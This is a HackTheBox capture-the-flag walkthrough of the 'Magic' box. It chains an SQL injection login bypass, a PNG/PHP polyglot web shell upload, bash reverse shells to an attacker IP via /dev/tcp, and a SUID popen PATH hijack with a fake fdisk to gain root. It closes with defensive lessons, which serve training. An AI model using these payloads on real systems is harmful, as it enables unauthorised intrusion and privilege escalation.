---
title: "Magic"
date: 2020-05-30
type: docs
tags:
  - htb
  - linux
  - medium
  - sqli
  - auth-bypass
  - file-upload
  - polyglot
  - magic-bytes
  - mysql
  - port-forward
  - suid
  - popen
  - path-hijack
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 18.04), **Difficulty:** Medium, **Released:** 2020-05-30, **IP:** `10.10.10.185` , `magic.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Login form is **SQL injectable**. `admin' #` in both fields bypasses authentication.
2. The image upload validates **magic bytes only**, not extension. Upload a **PNG/PHP polyglot** named `x.php.png` with `<?php system($_GET['cmd']); ?>` after the PNG header. RCE as `www-data`.
3. `db.php5` leaks `theseus : iamkingtheseus` (DB). `www-data` has no `mysql` client, so port forward `3306` and connect from your box. The `login` table has `admin : Th3s3usW4sK1ng`, which is also `theseus`'s system password. `su theseus`.
4. The SUID root binary `/bin/sysinfo` calls `fdisk`, `lshw`, `free` and others through `popen()` **without absolute paths**. Prepend a writable dir to `PATH`, drop a fake `fdisk`, run `sysinfo`. Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `db.php5` (DB) | `theseus : iamkingtheseus` |
| `login` table, reused for `su theseus` | `Th3s3usW4sK1ng` |
| `user.txt` | `/home/theseus/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Magic is an older box that still teaches three evergreen things well. **SQLi auth bypass** with the comment trick (`admin' #` turns `WHERE user='admin' # ' AND pass='...'` into just `WHERE user='admin'`). **Upload filter bypass with a polyglot**, because the server only checks that the file starts with the PNG magic bytes, so a file that is a valid PNG *and* valid PHP passes and executes. And a **SUID `popen()` PATH hijack**, where a setuid binary shells out to helper tools by name, so you control which binary runs.

Related SQLi auth bypass: [Stocker](/writeups/hackthebox/linux/easy/stocker/) (NoSQL version). Related upload filter bypass: [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Nexus](/writeups/hackthebox/linux/easy/nexus/). Related SUID PATH hijack: [Previse](/writeups/hackthebox/linux/easy/previse/), [Headless](/writeups/hackthebox/linux/medium/headless/), [Lookup](/writeups/tryhackme/linux/easy/lookup/).

---

## Full Walkthrough

### Recon

```console
Open 10.10.10.185:22
Open 10.10.10.185:80
```

when you go to the website there is a login. If you use the SQLi payload `admin' #` in both fields it bypasses the login.

In the page HTML there is `4d61676963`, which is hex for `magic`. Probably nothing, but worth noting.

`dirsearch` shows `/upload.php` (redirects to `login.php` when unauthenticated) and the standard `.shtml` error pages.

<div class="callout callout-note">

**Why `admin' #` works**

The query is likely `SELECT * FROM login WHERE username='$u' AND password='$p'`. Setting `$u = admin' #` makes it `... WHERE username='admin' #' AND password='...'`, and `#` comments out the rest, so only the username is checked. `' or 1=1 -- -` also works. The fix is parameterised queries; the app instead concatenates.

</div>

### Foothold, PNG/PHP polyglot upload

so we saw that we can upload images. We tried a Metasploit module and it got caught, and pentestmonkey's PHP reverse shell too, so we took a PNG of Rick Astley and in the middle of it we slapped in `<?php system($_GET['cmd']); ?>`, saved it as `rick2.php.png`, and visited:

```
http://10.10.10.185/images/uploads/rick2.php.png?cmd=id
```

Then a URL encoded bash reverse shell:

```
http://10.10.10.185/images/uploads/rick2.php.png?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9001+0>%261'
```

<div class="callout callout-note">

**Polyglot upload bypass**

The upload handler calls `getimagesize()` / checks the first bytes are `\x89PNG`, but it does not check the extension or re-encode the image. Apache is configured (via `mod_php` and a permissive `AddHandler`/`SetHandler` or `.php` in a multi extension) to execute `rick2.php.png` as PHP because it contains `.php`. So a file that is simultaneously a valid PNG and valid PHP satisfies the validator and runs. Adding the PHP after the `IEND` chunk, or inside a comment chunk, keeps the PNG valid.

</div>

### www-data to theseus

```php
// db.php5
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

`www-data` has no `mysql` binary. Upload a meterpreter shell (or a static `mysql`), port forward, and connect from the attack box:

```console
meterpreter > portfwd add -l 3306 -p 3306 -r 127.0.0.1
```

```console
$ mysql -u theseus -piamkingtheseus -h 127.0.0.1 Magic -e 'select * from login'
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
```

```console
www-data@ubuntu:/tmp$ su theseus
Password: Th3s3usW4sK1ng
theseus@ubuntu:/tmp$
```

### Privilege Escalation, SUID sysinfo PATH hijack

```console
theseus@ubuntu:~$ ls -l /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo
```

`theseus` is in `users`, so can run it. `ltrace /bin/sysinfo` shows it calling helpers via `popen`:

```console
popen("fdisk -l", "r")
popen("lshw -short", "r")
popen("free -h", "r")
popen("cat /proc/cpuinfo", "r")
```

<div class="callout callout-note">

**SUID + `popen` + relative name = root**

`popen("fdisk -l", "r")` runs `/bin/sh -c "fdisk -l"`, which resolves `fdisk` through `PATH`. Because `sysinfo` is SUID root and does not sanitise `PATH` or use absolute paths, you prepend a writable directory and drop your own `fdisk`:
```bash
cd /dev/shm
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.25/9002 0>&1\n' > fdisk
chmod +x fdisk
export PATH=/dev/shm:$PATH
/bin/sysinfo        # runs our fdisk as root
```
Listener catches a root shell. `chmod u+s /bin/bash` from the fake `fdisk` is a quieter alternative.

</div>

PWNED.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/theseus/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Parameterise every query.** The comment based auth bypass is 20 years old and still everywhere.
- **Validate uploads by re-encoding**, not by magic bytes. Store uploads outside the web root or with execution disabled, and force a single safe extension.
- **Do not configure Apache to run multi extension files as PHP.** `x.php.png` should be served as an image.
- **SUID binaries must use absolute paths** for every external command and reset `PATH` / the environment. `popen`/`system`/`exec*p` in a setuid program is a red flag.
- **Group membership is a privilege.** `theseus` could run `sysinfo` only because of the `users` group.

---

## Related Writeups

- **SQLi / NoSQLi auth bypass:** [Stocker](/writeups/hackthebox/linux/easy/stocker/)
- **Upload filter bypass (polyglot, extension, content type):** [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Nexus](/writeups/hackthebox/linux/easy/nexus/)
- **SUID PATH hijack / relative binary:** [Previse](/writeups/hackthebox/linux/easy/previse/), [Headless](/writeups/hackthebox/linux/medium/headless/), [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Plotted-TMS-v3](/writeups/tryhackme/linux/easy/plotted-tms-v3/)
- **Config file DB creds then password reuse:** [Previse](/writeups/hackthebox/linux/easy/previse/), [Stocker](/writeups/hackthebox/linux/easy/stocker/)

## References

- OWASP SQL Injection <https://owasp.org/www-community/attacks/SQL_Injection>
- Polyglot file uploads <https://github.com/Polydet/polyglot-database>
- GTFOBins on PATH abuse <https://gtfobins.github.io/>
